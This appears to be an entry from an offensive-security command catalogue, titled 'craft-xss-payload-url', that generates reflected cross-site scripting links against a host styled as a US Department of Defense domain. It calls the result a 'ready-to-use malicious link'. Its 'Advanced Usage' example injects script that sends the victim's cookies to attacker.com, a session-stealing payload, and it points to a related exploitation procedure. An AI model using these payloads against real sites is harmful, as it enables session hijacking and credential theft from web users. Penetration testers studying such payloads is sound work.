---
id: cmd-uuid-456
data: 'echo "https://example.dod.gov/search?q=%3Cscript%3Ealert(''XSS'')%3C/script%3E"'
tags:
  - xss
  - payload
  - web
type: command
output: 'https://example.dod.gov/search?q=<script>alert(''XSS'')</script>'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.422Z'
verified: false
validated: true
submitted: true
---
# craft-xss-payload-url

## Command

```bash
echo "https://example.dod.gov/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
```

## Description

This command generates a sample URL with an encoded XSS payload for testing reflected vulnerabilities. It outputs a ready-to-use malicious link that can be copied and accessed in a browser to trigger script execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Base URL | The target website URL (e.g., https://example.dod.gov/search?q=) | Yes |
| Payload | The JavaScript to inject (e.g., <script>alert('XSS')</script>, URL-encoded) | Yes |

## Examples

### Basic Usage

```bash
echo "https://example.dod.gov/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
```

### Advanced Usage

```bash
echo "https://example.dod.gov/search?q=%3Cscript%3Edocument.location='http://attacker.com?'+document.cookie%3C/script%3E"
```

## Expected Output

A printed URL string like: https://example.dod.gov/search?q=<script>alert('XSS')</script> (decoded for readability; use encoded in practice). Copy and paste into a browser to test.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-via-Malicious-URL]]
